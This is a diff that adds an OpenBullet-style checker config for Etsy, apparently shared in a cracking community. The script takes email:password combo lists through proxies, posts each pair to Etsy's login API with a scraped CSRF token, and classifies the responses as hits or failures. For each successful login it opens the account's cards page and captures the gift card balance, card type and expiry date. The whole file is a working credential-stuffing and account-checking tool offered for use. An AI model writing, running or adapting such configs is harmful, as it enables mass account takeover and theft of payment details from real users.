@@ -1,0 +1,95 @@
+[SETTINGS]
+{
+  "Name": "Etsy",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2021-01-10T20:39:49.6997298-08:00",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#KnightShad0w REQUEST GET "https://www.etsy.com/signin" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#KnightShad0w PARSE "<SOURCE>" CSS "[name=_nnc]" "value" -> VAR "tok" 
+
+#KnightShad0w REQUEST POST "https://www.etsy.com/api/v3/ajax/bespoke/member/neu/specs/Join_Neu_Controller" 
+  CONTENT "stats_sample_rate=0.1&specs%5BJoin_Neu_Controller%5D%5B%5D=Join_Neu_ApiSpec_Page&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bform_action%5D=%2Fsignin%3Ffrom_page%3Dhttps%253A%252F%252Fwww.etsy.com%252F%26from_action%3D&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bsubmit_attempt%5D=sign-in&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bwith_action_context%5D=false&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bview_type%5D=page&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bfrom_page%5D=https%3A%2F%2Fwww.etsy.com%2F&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bfrom_action%5D=&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bworkflow_identifier%5D=&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bworkflow_type%5D=&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Binitial_state%5D=sign-in&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5B_nnc%5D=<tok>&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bemail%5D=<USER>&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bfirst_name%5D=&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bpassword%5D=<PASS>&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bgoogle_user_id%5D=&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bgoogle_code%5D=&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bfacebook_user_id%5D=&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bfacebook_access_token%5D=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "cookie: sr=323328257c7872757277707479797779727676727272786735282c243b2e2f241e2e27273224357c6c746726332031292822202d7c000f060d046169082f35242d6913686109056106332031292822326107202c282d3861052833242235720570706137321e741e716131321e741e71686d062e2e262d2461082f226f67312d3426282f327c1a2e232b24223561112d3426282f00333320381c6d0229332e2c2461110507611728243624336d0f203528372461022d28242f3567232d3424352e2e35291e242f20232d24257c382432673324322e2d3435282e2f7c767779397072777767343224331e2026242f357c0c2e3b282d2d206e746f71616916282f252e3632610f156170716f717a6116282f77757a6139777568610031312d241624230a28356e7472766f727761690a09150c0d6d612d282a24610624222a2e68610229332e2c246e79706f716f757175756f707378611220272033286e7472766f7277672920321e3624231e2533283724337c27202d3224672c283232282f261e36282f252e361e2229332e2c247c27202d3224672d202f2634202624327c242f6c14126d242f672d202f26342026247c242f6c14126735202c312433282f267c222e2f322e2d246f25242334267b716d2229332e2c246f2031316f26243505243520282d327b716d2f2037282620352e336f3124332c283232282e2f326f30342433387b71672920321e2d24391e27342f2235282e2f7c35333424672920321e342f353334323524251e24377c27202d3224672437242f35327c2c2e3432242c2e37247b357c353334246d272e223432282f7c6d7b357c353334246d222d28222a7c6d7b357c353334246d2c2e3432242c2e37247b357c353334246d272e223432282f7c242c20282d6d2b2e282f1e2f24341e242c20282d1e2728242d257b357c353334246d2c2e3432242c2e37247b357c353334246d2d2e20257b357c353334246d272e223432282f7c242c20282d6d2b2e282f1e2f24341e242c20282d1e2728242d257b357c353334246d2c2e3432242c2e37247b357c353334246d2a243834317c242c20282d6d2b2e282f1e2f24341e242c20282d1e2728242d257b357c35333424673124332c283232282e2f321e282f222e292433242f357c27202d3224; uaid=Ccj2xO0Wjg6upxnRo39LlOoAW05jZACCuI1JZ2B0tVJpYmaKkpVSmLl7hIV5YHpGeYRvWGRiQJi5QVRQlmuSm5dBoFItAwA.; user_prefs=GxqBUqRS2DZx-tVORRVkpLvMNhVjZACCuI1JZ2B0tFJosIuSTl5pTo6OUmqebmiwko4SiACLGEEoXEQsAwA.; fve=1588683468.0; last_browse_page=https%3A%2F%2Fwww.etsy.com%2F; ua=531227642bc86f3b5fd7103a0c0b4fd6; _gcl_au=1.1.222450229.1588683476; _ga=GA1.2.861704178.1588683481; _gid=GA1.2.1849247711.1588683481; G_ENABLED_IDPS=google; LD=1; _dc_gtm_UA-2409779-1=1; _uetsid=_uet5c035564-3c00-6a88-9853-6638520e025f; exp_hangover=B5byv7ncSvbd2vlWkg1gxXYsAu5jZACCuI1JZyB0CkO1UnlqUnxiUUlmWmZyZmJOfE5iSWpecmV8oUm8kYGhpZKVUmZeak5memZSTqpSLQMA; granify.uuid=64658c37-a735-4aab-a8b6-f18c2f5a8af3; granify.session.qivBM=-1" 
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "origin: https://www.etsy.com" 
+  HEADER "referer: https://www.etsy.com/signin" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "x-csrf-token: <tok>" 
+  HEADER "x-detected-locale: EUR|en-US|FR" 
+  HEADER "x-page-guid: e6cb2d1abdd.5d6245c9369420b31361.00" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+#KnightShad0w KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "class=\\\"has-error-msg mt-xs-1 text-red" 
+    KEY "\"render_aborted\":false" 
+  KEYCHAIN Retry OR 
+    KEY "Connection error during authentication" 
+  KEYCHAIN Success OR 
+    KEY "redirect_to_url\":\"" 
+
+#KnightShad0w REQUEST GET "https://www.etsy.com/your/account/cards" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#KnightShad0w KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" AND 
+    KEY "<SOURCE>" DoesNotContain "<span class=\"card-icon card-icon" 
+    KEY "<span class='currency-value'>0.00" 
+  KEYCHAIN Custom "FREE" AND 
+    KEY "<span class='currency-value'>0,00" 
+    KEY "<SOURCE>" DoesNotContain "<span class=\"card-icon card-icon" 
+  KEYCHAIN Custom "CUSTOM" AND 
+    KEY "<SOURCE>" DoesNotContain "<span class='currency-value'" 
+    KEY "<SOURCE>" DoesNotContain "<span class=\"card-icon card-icon" 
+
+#KnightShad0w PARSE "<SOURCE>" LR "currency-value'>" "</span>" CreateEmpty=FALSE -> CAP "Gift card Balance" 
+
+#KnightShad0w PARSE "<SOURCE>" LR "card-info\">" "<span>" CreateEmpty=FALSE -> CAP "Card type" 
+
+#KnightShad0w PARSE "<SOURCE>" LR "Expires on " "<br />" CreateEmpty=FALSE -> CAP "Expires on " 
+  
